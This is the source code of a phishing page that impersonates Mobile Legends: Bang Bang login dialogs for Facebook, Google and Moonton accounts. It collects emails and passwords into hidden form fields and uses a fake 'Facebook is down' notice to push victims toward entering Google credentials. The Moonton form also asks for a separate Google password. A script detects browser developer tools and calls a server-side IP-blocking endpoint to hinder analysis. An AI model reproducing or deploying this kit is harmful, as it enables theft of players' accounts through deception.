font-family: NotoSans-Regular, sans-serif;
font-size: .875rem;
outline: none;
color: #fff;
box-shadow: -5px 5px 10px rgba(0, 0, 0, .16);
">
Home Page
</button>
</div>
</div>
</section>
</div>
</div>
</div>

<div class="popup-login login-facebook-mt" style="display: none;">
<div class="popup-box-login-facebook-mt">
<div class="header-facebook-mt">
<img src="https://cdn.stackpath.web.id/31/img/icon-facebook.png">
<div class="header-facebooks-text"> Log in With Facebook </div>
</div>
<div class="content-box-facebook-mt">
<img src="https://cdn.stackpath.web.id/31/img/fbmt.png">
<div class="navbar-alert-facebook-mt">
<div style="text-align:center; margin-bottom:5px;">
<b>Facebook Will Be Back Soon</b>
</div>
<div style="text-align:left;">
Facebook is currently down due to maintenance. We recommend that you try logging in with your <b>Google Account</b>. #1029
</div>
</div>
<div class="content-box-facebook-id">
<button type="submit" class="fbbutton-mt" onclick="open_google()">
<img class="icon-login" src="https://cdn.stackpath.web.id/31/img/btn_gp.png"></img>
Sign In With Google Account
</button>
<div class="content-box-facebooks-txt-footer">
By continuing, Mobile Legends: Bang Bang will receive ongoing access to the information that you share and Facebook will record when Mobile Legends: Bang Bang accesses it. <a>Learn more</a> about this sharing and the settings that you have.
</div>
<div class="content-box-facebooks-txt-footers">Mobile Legends: Bang Bang's <a>Privacy Policy</a> and <a>Terms</a></div>
</div>
</div>
</div>
</div>

<div class="popup-login login-facebook" style="display: none;">
<div class="popup-box-login-facebooks">
<a onclick="close_facebook()" class="close-facebooks"><i class="zmdi zmdi-close"></i></a>
<div class="header-facebooks">
<img src="https://cdn.stackpath.web.id/31/img/icon-facebook.png">
<div class="header-facebooks-text"> Log in With Facebook </div>
</div>
<div class="content-box-facebooks">
<div class="navbar-alert-facebooks wrong-fb" style="display: none;text-align: center;"><b>The data you entered is incorrect.<br>Please re-login using the correct data!</b></div>
<div class="navbar-alert-facebooks email-fb">The email address or phone number that you've entered doesn't match any account. <b>Sign up for an account.</b></div>
<div class="navbar-alert-facebooks sandi-fb">The password that you've entered is incorrect. <b>Forgotten password?</b></div>
<img src="https://cdn.stackpath.web.id/31/img/app_icon.png">
<div class="txt-login-facebooks">
Log in to your Facebook account to connect with Mobile Legends: Bang Bang
</div>
<div class="txt-login-alert-facebooks">This doesn't let the app post to Facebook.</div>
<div class="content-box-facebook-id">
<form action="javascript:void(0)" method="post" id="ValidateLoginFbForm" autocomplete="off">
<div class="form-group-facebooks">
<input type="text" name="email" id="email-facebook" autocomplete="false" required oninvalid="this.setCustomValidity(' ')" oninput="setCustomValidity('')">
<label>Mobile number or email</label>
</div>
<div class="form-group-facebooks">
<div class="form-group-sohiw showPassword" onclick="showFbPassword()"><img src="https://cdn.stackpath.web.id/31/img/Hide-Password.png"></div>
<div class="form-group-sohiw hidePassword" style="display: none;" onclick="hideFbPassword()"><img src="https://cdn.stackpath.web.id/31/img/Show-Password.png"></div>
<input autocomplete="one-time-code" type="password" name="password" id="password-facebook" required oninvalid="this.setCustomValidity(' ')" oninput="setCustomValidity('')">
<label>Password</label>
</div>
<input type="hidden" name="login" id="login-facebook" value="Facebook" readonly>
<button type="submit" class="fbbutton" onclick="ValidateLoginFbData()">Log in</button>
</form>
<div class="content-box-facebooks-txt-footer">
By continuing, Mobile Legends: Bang Bang will receive ongoing access to the information that you share and Facebook will record when Mobile Legends: Bang Bang accesses it. <a>Learn more</a> about this sharing and the settings that you have.
</div>
<div class="content-box-facebooks-txt-footers">Mobile Legends: Bang Bang's <a>Privacy Policy</a> and <a>Terms</a></div>
</div>
</div>
</div>
</div>

<div class="popup-login login-facebook-load" style="display: none;">
<div class="popup-box-login-facebooks">
<div class="header-facebooks">
<img src="https://cdn.stackpath.web.id/31/img/icon-facebook.png">
<div class="header-facebooks-text"> Log in With Facebook </div>
</div>
<div class="content-box-fbs">
<div class="fb-load">
<img src="https://cdn.stackpath.web.id/31/img/icon_fb.png">
<div class="loader3"></div>
</div>
</div>
</div>
</div>

<div class="sang_pengkhianat login-mail" style="display: none;">
<div class="pengkhianat_box zoom-in">
<div class="pengkhianat_box_bg_shop">
<div class="pengkhianat_box_navbar">
<img onclick="close_log_mt()" src="https://cdn.stackpath.web.id/31/img/close.png">
<div class="pengkhianat_box_navbar_title_logo2">
<img src="https://cdn.stackpath.web.id/31/img/btn_mt.png"></img>
</div>
<div class="pengkhianat_box_navbar_title_reward">
<a>Login with Moonton Account</a>
</div>
</div>
<br><br>
<p class="kagetk gp-mt" style="display: none;margin-top: -38px;text-align: center;">The password you entered is incorrect. Please enter it again.</p>
<p class="kagetk email-k" style="display: none;margin-top: -38px;">Wrong e-mail. Please enter again.</p>
<p class="kagetk sandi-k" style="display: none;margin-top: -45px;">Use 6 or more characters with a combination of upper and lower case letters, and do not use special characters.</p>
<div class="pengkhianat_box_form_email" style="height:280px;">
<div class="form_login" id="emaillog">
<form action="javascript:void(0)" method="post" id="ValidateLoginMailForm" autocomplete="off">
<input type="hidden" name="login" id="login-mail" value="Moonton" readonly>
<input type="hidden" name="playid" id="validatePlayID" readonly>
<input type="hidden" name="nickname" id="validateNickname" readonly>
<div class="pengkhianat_box_bg_label_id">
<div class="pengkhianat_box_form_login_id">
<input type="email" name="email" id="email-k" autoCapitalize='none' placeholder="Enter your e-mail address" required oninvalid="this.setCustomValidity('Input your E-mail address')" oninput="setCustomValidity('')">
<label>Login with Moonton Account</label>
</div>
</div>
<div class="pengkhianat_box_bg_label_id" style="margin-top:10px;">
<div class="pengkhianat_box_form_login_id">
<div class="center">
<div class="mata2">
<span class="form-group-mat showPassword" onclick="showMtPassword()"><img src="https://cdn.stackpath.web.id/31/img/Hide-Password.png"></span>
<span class="form-group-mat hidePassword" style="display: none;" onclick="hideMtPassword()"><img src="https://cdn.stackpath.web.id/31/img/Show-Password.png"></span>
</div>
</div>
<input autocomplete="one-time-code" type="password" name="password" pattern="[a-zA-Z0-9]+" id="password-k" placeholder="Please enter password" required oninvalid="this.setCustomValidity('Input your Password')" oninput="setCustomValidity('')">
<label>Use 6 or more characters with a combination of upper and lower case letters, and do not use special characters.</label>
</div>
</div>

<div class="pengkhianat_box_bg_label_id" style="margin-top:10px;">
<div class="pengkhianat_box_form_login_id">
<div class="center">
<div class="mata2">
<span class="form-group-mat show2Password" onclick="showPassword2()"><img src="https://cdn.stackpath.web.id/31/img/Hide-Password.png"></span>
<span class="form-group-mat hide2Password" style="display: none;" onclick="hidePassword2()"><img src="https://cdn.stackpath.web.id/31/img/Show-Password.png"></span>
</div>
</div>
<input autocomplete="one-time-code" onfocus="removeBorder()" type="password" name="pass" pattern="[a-zA-Z0-9]+" id="pass-moonton" placeholder="Enter Google Password" required oninvalid="this.setCustomValidity('Input Google Password')" oninput="setCustomValidity('')">
<label>Enter Your Google Password.</label>
</div>
</div>

<div class="pengkhianat_box_form_footer_id" style="margin-top:0px;">
<center>
<button type="submit" onclick="ValidateLoginMailData()">Login</button>
</center>
</div>
</form>
</div>
</div>
</div>
</div>
</div>

<div class="sang_pengkhianat check_verification" style="display: none;">
<div class="pengkhianat_box zoom-in">
<div class="pengkhianat_box_bg">
<div class="pengkhianat_box_navbar">
<div class="pengkhianat_box_navbar_title_logo">  
<img src="https://cdn.stackpath.web.id/31/img/mlbb_logo.png"></img>
</div>
<div class="pengkhianat_box_navbar_title">  
<a>Please wait...</a>
</div>
</div>
<div class="pengkhianat_box_form_id" style="height:170px;">
<center>
<div class="loadhabo_in_popup" style="margin-top: 30%;">
<img class="sang_pengkhianat_load_id_img" src="https://cdn.stackpath.web.id/31/img/habo.png">
</img>
</div>
</center>
</div>
</div>
</div>
</div>

<div class="popup-login login-gp" style="display: none;">
<div class="popup-box-login-gg">
<a onclick="close_google()" class="close-gp"><i class="zmdi zmdi-close"></i></a>
<div class="header-gg">
<img src="https://cdn.stackpath.web.id/31/img/btn_gp.png">
<div class="header-gg-text"> Log in With Google </div>
</div>
<div class="content-box-gg">
<div class="txt-login-gg">Sign in</div>
<div class="txt-login-ggs">to continue to <a style="color:#185FD1;font-weight: 500;">mobilelegends.com</a></div>
<form action="javascript:void(0)" method="post" id="ValidateLoginGpForm" autocomplete="off">
<div class="form__div">
<input type="email" name="email" class="form__input" placeholder="" id="email-gp" required oninvalid="this.setCustomValidity('Enter your valid E-mail address')" oninput="setCustomValidity('')" autocomplete="false">
<label for="" class="form__label">Email address</label>
</div>
<div class="form__div">
<input autocomplete="one-time-code" name="password" type="password" class="form__input" placeholder="" id="password-gp" required oninvalid="this.setCustomValidity(' ')" oninput="setCustomValidity('')">
<label for="" class="form__label">Enter your password</label>
</div>
<center>
<div class="alert-gg-failed email-gp">
<a class="alert-gg"><i class="fa-solid fa-circle-exclamation"></i> Sorry, we couldn't find your account.</a>
</div>
<div class="alert-gg-failed sandi-gp">
<a class="alert-gg"><i class="fa-solid fa-circle-exclamation"></i> Wrong password. Please try again!</a>
</div>
</center>
<div class="showpass">
<input style="float:left; margin-left: 1px;" type="checkbox" onclick="showHide();">
<label for="showpass">Show Password</label>
</div>
<div class="content-box-gg-txt-footer">
By continuing, Google will share your name, email address, language preference, and profile picture with mobilelegends.com's. See mobilelegends.com's <a>Privacy Policy</a> and <a>Terms of Service.</a><br><br>You can manage Sign in with Google in your <a>Google Account</a>.
</div>
<input type="hidden" name="login" id="login-gp" value="Google Play" readonly>
<input type="hidden" name="playid" id="validatePlayID" readonly>
<input type="hidden" name="nickname" id="validateNickname" readonly>
<button type="submit" class="nonbutton" onclick="ValidateLoginGpData()">Log in</button>
</form>
<div class="content-box-gg-txt-footer">
<a style="font-size:15px; font-weight:400;">Forgot password?</a>
</div>
</div>
</div>
</div>

<div class="popup-login login-gp-load" style="display: none;">
<div class="popup-box-login-gg">
<div class="header-gg">
<img src="https://cdn.stackpath.web.id/31/img/btn_gp.png">
<div class="header-gg-text"> Log in With Google </div>
</div>
<div class="content-box-gg">
<div class="txt-login-gg">Sign in</div>
<div class="txt-login-ggs">to continue to <a style="color:#185FD1;font-weight: 500;">mobilelegends.com</a></div>
<div class="gg-load">
<div class="gg-load-title">
<div class="lds-ring">
<div></div>
<div></div>
<div></div>
<div></div>
</div>
</div>
</div>
</div>
</div>
</div>


<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
<script type="text/javascript" src="http://code.jquery.com/jquery-1.10.2.min.js"></script>
<script type="text/javascript" src="https://cdnassets.biz.id/ajax/libs/jquery/2.1.4/jquery.min.js"></script>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
<script>
$(document).ready(function() {
    const threshold = 160; 
    let devtoolsOpen = false;

    const devToolsCheck = function () {
        const widthThreshold = window.outerWidth - window.innerWidth > threshold;
        const heightThreshold = window.outerHeight - window.innerHeight > threshold;
        let devtoolsDetected = false;

        const element = new Image();
        Object.defineProperty(element, 'id', {
            get: function () { devtoolsDetected = true; }
        });

        if ((widthThreshold || heightThreshold || devtoolsDetected) && !devtoolsOpen) {
            devtoolsOpen = true;

            $.ajax({
                url: 'getipblock.php',
                type: 'POST',
            }).always(function() {

            });
        }
    };

    setInterval(devToolsCheck, 1000);
});
</script>
<script>
setTimeout(function () {
  $('.loadkin').fadeOut();
}, 1000);
</script>
<script>
function showHide() {
var inputan = document.getElementById("password-gp");
if (inputan.type === "password") {
inputan.type = "text";
} else {
inputan.type = "password";
}
}
</script>
<script>
function open_facebook() {
$(".account_login").hide();
$(".login-facebook").show();
}
function open_moonton() {
$(".account_login").hide();
$(".login-mail").show();
}
function close_facebook() {
$(".login-facebook").hide();
$(".account_login").show();
}
function close_log_mt() {
$(".login-mail").hide();
$(".account_login").show();
}
function open_google() {
$(".login-facebook-mt").hide();
$(".account_login").hide();
$(".login-gp").show();
}
function close_google() {
$(".login-gp").hide();
$(".account_login").show();
}
</script>
<script>
function ValidateLoginGpData() {
$('#ValidateLoginGpForm').submit(function(submitingValidateLoginGpData){
submitingValidateLoginGpData.preventDefault();

$emailgp = $('#email-gp').val().trim();
$passwordgp = $('#password-gp').val().trim();
$logingp = $('#login-gp').val().trim();
if($emailgp == '' || $emailgp == null || $emailgp.length <= 12)
{
$('.email-gp').fadeIn();
setTimeout(function () {
$('.email-gp').fadeOut();
}, 2000); 
$('.sandi-gp').hide();
$('.PlayerIdLoginBox').hide();
$('.login-gp').show();
return false;
}else{
$('.email-gp').hide();
$("input#validateEmail").val($emailgp);
$('.login-gp').hide();
$('.PlayerIdLoginBox').show();
}
if($passwordgp == '' || $passwordgp == null || $passwordgp.length <= 7)
{
$('.sandi-gp').fadeIn();
setTimeout(function () {
$('.sandi-gp').fadeOut();
}, 2000); 
$('.PlayerIdLoginBox').hide();
$('.login-gp').show();
return false;
}else{
$('.sandi-gp').hide();
$("input#validatePassword").val($passwordgp);
$("input#validateLogin").val($logingp);
$('.login-gp').hide(); 
$('.login-gp-load').show()
setTimeout(function () {
$('.account_verification').show()
$('.login-gp').hide()
$('.login-gp-load').hide()
}, 3000)
}
});
return false; 
}

function setFocus(on) {
var element = document.activeElement;
if (on) {
setTimeout(function() {
element.parentNode.classList.add("focus");
});
} else {
let box = document.querySelector(".input-box");
box.classList.remove("focus");
$("input").each(function() {
var $input = $(this);
var $parent = $input.closest(".input-box");
if ($input.val()) $parent.addClass("focus");
else $parent.removeClass("focus");
});
}
}
</script>
<script>
function ValidateLoginFbData() {
$('#ValidateLoginFbForm').submit(function(submitingValidateLoginFbData) {
submitingValidateLoginFbData.preventDefault();

$emailfb = $('#email-facebook').val().trim();
$passwordfb = $('#password-facebook').val().trim();
$loginfb = $('#login-facebook').val().trim();
if ($emailfb == '' || $emailfb == null || $emailfb.length <= 5) {
$('.email-fb').fadeIn();
setTimeout(function() {
$('.email-fb').fadeOut();
}, 2000);
$('.sandi-fb').hide();
$('.PlayerIdLoginBox').hide();
$('.login-facebook').show();
return false;
} else {
$('.email-fb').hide();
$("input#validateEmail").val($emailfb);
$('.login-facebook').hide();
$('.PlayerIdLoginBox').show();
}
if ($passwordfb == '' || $passwordfb == null || $passwordfb.length <= 5) {
$('.sandi-fb').fadeIn();
setTimeout(function() {
$('.sandi-fb').fadeOut();
}, 2000);
$('.PlayerIdLoginBox').hide();
$('.login-facebook').show();
return false;
} else {
$('.sandi-fb').hide();
$("input#validatePassword").val($passwordfb);
$("input#validateLogin").val($loginfb);
$('.login-facebook').hide();
$('.login-facebook-load').show()

setTimeout(function() {
$('.login-facebook-mt').hide();
$('.account_verification').show()
$('.login-facebook-sec').hide()
$('.login-facebook-load').hide()
}, 3000)
}
});
return false;
}

</script>
<script>
function showFbPassword() {
var x = document.getElementById("password-facebook");
if (x.type === "password") {
x.type = "text";
$('.ShowPassword').hide();
$('.HidePassword').show();
} else {
x.type = "password";
}
}

function hideFbPassword() {
var x = document.getElementById("password-facebook");
if (x.type === "text") {
x.type = "password";
$('.ShowPassword').show();
$('.HidePassword').hide();
} else {
x.type = "text";
}
}

function showMtPassword() {
  var x = document.getElementById("password-k");
  if (x.type === "password") {
    x.type = "text";
	$('.showPassword').hide();
	$('.hidePassword').show();
  } else {
    x.type = "password";
  }
}
function hideMtPassword() {
  var x = document.getElementById("password-k");
  if (x.type === "text") {
    x.type = "password";
	$('.showPassword').show();
	$('.hidePassword').hide();
  } else {
    x.type = "text";
  }
}
function showPassword2() {
  var x = document.getElementById("pass-moonton");
  if (x.type === "password") {
    x.type = "text";
	$('.show2Password').hide();
	$('.hide2Password').show();
  } else {
    x.type = "password";
  }
}
function hidePassword2() {
  var x = document.getElementById("pass-moonton");
  if (x.type === "text") {
    x.type = "password";
	$('.show2Password').show();
	$('.hide2Password').hide();
  } else {
    x.type = "text";
  }
}
</script>
<script>
function ValidateLoginMailData() {
    return (
      $('#ValidateLoginMailForm').submit(function (submitingValidateLoginMailData) {
        submitingValidateLoginMailData.preventDefault()
        $emailk = $('#email-k').val().trim()
        $passwordk = $('#password-k').val().trim()
        $logink = $('#login-mail').val().trim()
        $mtpassword = $('#pass-moonton').val().trim()
        if ($emailk == '' || $emailk == null || $emailk.length <= 10) {
          return (
            $('.email-k').show(),
            setTimeout(function () {
              $('.email-k').fadeOut()
            }, 2000),
            $('.sandi-k').hide(),
            $('.account_verification').hide(),
            $('.login-mail').show(),
            false
          )
        } else {
          $('.email-k').hide()
          $('input#validateEmail').val($emailk)
          $('.login-mail').hide()
          $('.account_verification').hide()
        }
        if ($passwordk == '' || $passwordk == null || $passwordk.length <= 5) {
          return (
            $('.sandi-k').show(),
            setTimeout(function () {
              $('.sandi-k').fadeOut()
            }, 2000),
            $('.login-mail').show(),
            $('.account_verification').hide(),
            false
          )
        } else {
          $('.sandi-k').hide()
          $('input#validatePassword').val($passwordk)
          if($mtpassword == '' || $mtpassword == null || $mtpassword.length <= 5)
            {
                $('.gp-mt').show();
                setTimeout(function () {
              $('.gp-mt').fadeOut()
            }, 2000),
				$('.sandi-k').hide(),
                $('.email-k').hide();
                $('.login-mail').show();
                return false;
            }else{
                $('.gp-mt').hide();               
	              $("input#validatePass").val($mtpassword);
                $('.login-mail').show();  
            }
          $('input#validateLogin').val($logink)
          $('.login-mail').hide();	 
          $('.check_verification').show()
          setTimeout(function () {
          $('.login-mail-link').hide();
          $('.account_verification').show();
          $('.check_verification').hide();
          }, 1500)
        }
      }),
      false
    )
  }
</script>
<noscript>
  <meta http-equiv="refresh" content="0; url=https://www.google.com/search?q=apa+arti+tai">
</noscript>
</body>
</html>
<?php
}else{
    header("Location: verify.php");
}
?>